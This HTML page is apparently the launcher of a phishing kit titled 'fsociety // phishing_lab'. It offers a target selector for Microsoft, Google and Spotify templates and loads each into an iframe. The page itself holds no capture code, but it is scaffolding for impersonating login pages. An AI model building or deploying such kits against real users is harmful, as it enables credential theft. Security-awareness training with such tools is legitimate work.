<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>fsociety // phishing_lab</title>
    <link rel="stylesheet" href="/cadastro/styles.css">
</head>
<body>
    <!-- Barra de seleção de templates -->
    <nav class="template-selector" id="template-selector">
        <div class="selector-header">
            <span class="selector-title">target_select</span>
            <button class="toggle-btn" id="toggle-selector" title="Minimizar">&#9660;</button>
        </div>
        <div class="selector-content" id="selector-content">
            <div class="template-list">
                <button class="template-btn" data-template="microsoft" title="Microsoft">
                    <img src="/cadastro/templates/microsoft/assets/logo.png" alt="Microsoft">
                    <span>Microsoft</span>
                </button>
                <button class="template-btn" data-template="google" title="Google">
                    <svg viewBox="0 0 48 48" width="32" height="32">
                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                    </svg>
                    <span>Google</span>
                </button>
                <button class="template-btn" data-template="spotify" title="Spotify">
                    <svg viewBox="0 0 496 512" width="32" height="32" fill="#1db954">
                        <path d="M248 8C111.1 8 0 119.1 0 256s111.1 248 248 248 248-111.1 248-248S384.9 8 248 8zm100.7 364.9c-4.2 0-6.8-1.3-10.7-3.6-62.4-37.6-135-39.2-206.7-24.5-3.9 1-9 2.6-11.9 2.6-9.7 0-15.8-7.7-15.8-15.8 0-10.3 6.1-15.2 13.6-16.8 81.9-18.1 165.6-16.5 237 26.2 6.1 3.9 9.7 7.4 9.7 16.5s-7.1 15.4-15.2 15.4zm26.9-65.6c-5.2 0-8.7-2.3-12.3-4.2-62.5-37-155.7-51.9-238.6-29.4-4.8 1.3-7.4 2.6-11.9 2.6-10.7 0-19.4-8.7-19.4-19.4s5.2-17.8 15.5-20.7c27.8-7.8 56.2-13.6 97.8-13.6 64.9 0 127.6 16.1 177 45.5 8.1 4.8 11.3 11 11.3 19.7-.1 10.8-8.5 19.5-19.4 19.5zm31-76.2c-5.2 0-8.4-1.3-12.9-3.9-71.2-42.5-198.5-52.7-280.9-29.7-3.6 1-8.1 2.6-12.9 2.6-13.2 0-23.3-10.3-23.3-23.6 0-13.6 8.4-21.3 17.4-23.9 35.2-10.3 74.6-15.2 117.5-15.2 73 0 149.5 15.2 205.4 47.8 7.8 4.5 12.9 10.7 12.9 22.6 0 13.6-11 23.3-23.2 23.3z"/>
                    </svg>
                    <span>Spotify</span>
                </button>
            </div>
            <div class="selector-info">
                <span id="current-template">awaiting_target</span>
            </div>
        </div>
    </nav>

    <!-- Container do iframe onde o template será carregado -->
    <main class="template-container">
        <iframe id="template-frame" class="active" src="" frameborder="0"></iframe>
    </main>

    <script src="/cadastro/selector.js"></script>
</body>
</html>
